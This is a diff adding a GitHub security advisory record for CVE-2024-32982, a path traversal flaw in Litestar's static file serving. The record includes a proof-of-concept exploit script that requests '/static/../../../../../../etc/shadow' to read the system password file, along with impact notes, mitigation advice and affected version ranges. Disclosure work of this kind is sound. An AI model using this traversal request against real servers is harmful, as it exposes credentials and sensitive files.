@@ -1,0 +1,130 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-83pv-qr33-2vcf",
+  "modified": "2024-07-08T18:47:28Z",
+  "published": "2024-05-06T14:20:50Z",
+  "aliases": [
+    "CVE-2024-32982"
+  ],
+  "summary": "Litestar and Starlite vulnerable to Path Traversal",
+  "details": "# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "litestar"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.8.0"
+            },
+            {
+              "fixed": "2.8.3"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "starlite"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.37.0"
+            },
+            {
+              "fixed": "1.51.16"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "litestar"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.7.0"
+            },
+            {
+              "fixed": "2.7.2"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "litestar"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "fixed": "2.6.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32982"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/litestar-org/litestar/commit/a07b79b84d8717bec5ac4d4674c1e4920ba9c813"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/litestar-org/litestar"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-05-06T14:20:50Z",
+    "nvd_published_at": "2024-05-06T15:15:23Z"
+  }
+}
